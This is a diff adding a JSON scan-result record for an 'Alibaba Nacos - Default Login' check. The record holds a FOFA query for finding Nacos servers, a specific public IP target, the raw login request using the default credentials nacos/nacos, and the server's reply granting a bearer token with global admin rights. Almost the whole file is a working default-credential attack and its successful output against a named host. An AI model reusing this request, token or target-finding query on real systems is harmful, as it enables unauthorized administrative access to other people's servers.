@@ -1,0 +1,32 @@
+{
+    "nacos-default-login": {
+        "info": {
+            "name": "Alibaba Nacos - Default Login",
+            "author": "SleepingBag945",
+            "severity": "high",
+            "description": "The default username and password for Nacos are both nacos.\n",
+            "classification": {
+                "cpe": "cpe:2.3:a:alibaba:nacos:*:*:*:*:*:*:*:*"
+            },
+            "metadata": {
+                "verified": true,
+                "max-request": 2,
+                "vendor": "alibaba",
+                "product": "nacos",
+                "fofa-query": "title==\"Nacos\""
+            },
+            "tags": "nacos,default-login,alibaba"
+        },
+        "targets": [
+            {
+                "target": "http://47.95.142.16:8848",
+                "req_resp": [
+                    {
+                        "req": "POST /nacos/v1/auth/users/login HTTP/1.1\r\nHOST: 47.95.142.16\r\nUser-Agent: Nacos-Server\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nHost: 47.95.142.16:8848\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 29\r\n\r\nusername=nacos&password=nacos",
+                        "resp": "HTTP/1.1 200\r\nDate: Fri, 21 Mar 2025 14:29:47 GMT\r\nContent-Type: application/json;charset=UTF-8\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\nAuthorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTc0MjU4NTM4N30.ZgcCcvP56ifUmuPuXWxam2bGkGw3l_xNH0q3-wzJEno\r\n\r\n{\"accessToken\":\"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTc0MjU4NTM4N30.ZgcCcvP56ifUmuPuXWxam2bGkGw3l_xNH0q3-wzJEno\",\"tokenTtl\":18000,\"globalAdmin\":true,\"username\":\"nacos\"}"
+                    }
+                ]
+            }
+        ]
+    }
+}
